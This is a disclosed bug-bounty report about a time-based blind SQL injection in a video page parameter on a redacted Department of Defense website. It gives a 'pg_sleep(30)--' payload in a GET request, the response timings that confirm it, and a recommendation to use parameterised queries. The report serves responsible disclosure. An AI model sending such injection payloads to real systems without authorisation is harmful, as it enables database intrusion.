# Blind SQL Injection on DoD Site

## Report Details
- **Report ID**: 242882
- **URL**: https://hackerone.com/reports/242882
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-06-24T13:09:18.095Z
- **Disclosed**: 2019-12-02T19:00:34.732Z

## Reporter
- **Username**: mr_r3boot
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi There, One of the DoD Site is vulnerable to blind sql injection.

#Affected Domain:
www.███

#PoC:
Navigate to below url
``http://www.█████████/viewVideo.asp?t=7``

Just replace ``7`` with ``pg_sleep(__30__)--``

***GET /viewVideo.asp?t=pg_sleep(__30__)--***

As a response you can see time delay compared with ``viewVideo.asp?t=7``

#####Time Slot:

*viewVideo.asp?t=7*                               -----------> 240-330 milliseconds
*viewVideo.asp?t=pg_sleep(__30__)--*    -----------> 15000-19000 milliseconds

#Fix:
Should sanitize the dangerous input or using parameterised queries.

Let me know if any further info is required.

Regards,
**Mr_R3boot**.

## Attachments
No attachments
